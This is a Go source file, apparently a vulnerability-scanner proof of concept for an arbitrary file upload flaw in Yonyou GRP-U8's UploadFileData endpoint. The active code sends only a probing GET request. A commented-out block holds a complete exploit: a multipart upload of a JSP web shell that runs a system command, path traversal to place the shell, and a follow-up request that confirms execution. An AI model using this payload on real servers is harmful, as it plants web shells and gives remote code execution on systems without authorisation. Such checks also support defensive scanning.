package yonyou

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)
//用友 GRP-u8 UploadFileData 前台存在任意文件上传漏洞


func UploadFileData(u string) bool {
	// data := `<% {java.io.InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println("whoami:"+new String(b));}out.print("</pre>");} %>`
// 	data := `--53db55c2feb70c7f3754fd9a30c0152a
// Content-Disposition: form-data; name="file"; filename="asd.jsp"

// <% {java.io.InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println("whoami:"+new String(b));}out.print("</pre>");} %>
// --53db55c2feb70c7f3754fd9a30c0152a--`
// 	header := make(map[string]string)
// 	header["Content-Type"] = "multipart/form-data; boundary=53db55c2feb70c7f3754fd9a30c0152a"
// 	header["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
// 	header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"

// 	if req, err := pkg.HttpRequset(u+"/UploadFileData?action=upload_file&filename=../.Ttest00ls.jsp", "POST", data, false, header); err == nil {
// 		if strings.Contains(req.Body, "showSucceedMsg") {
// 			if req2, err := pkg.HttpRequset(u+"/R9iPortal/.Ttest00ls.jsp", "GET", "", false, nil); err == nil {
// 				if req2.StatusCode == 200 && strings.Contains(req2.Body, "whoami") {
// 					pkg.GoPocLog(fmt.Sprintf("Found vuln yonyou 存在u8Grp文件上传漏洞！|%s\n", u+"/R9iPortal/.Ttest00ls.jsp"))
// 					return true

// 				}		 
// 			}
// 		}
// 	}	

	if req, err := pkg.HttpRequset(u+"/UploadFileData", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "showSucceedMsg"){
			pkg.GoPocLog(fmt.Sprintf("Found may be vuln yonyou UploadFileData-rce |%s\n", u+"/UploadFileData"))
			return true
		}
	}
	return false
}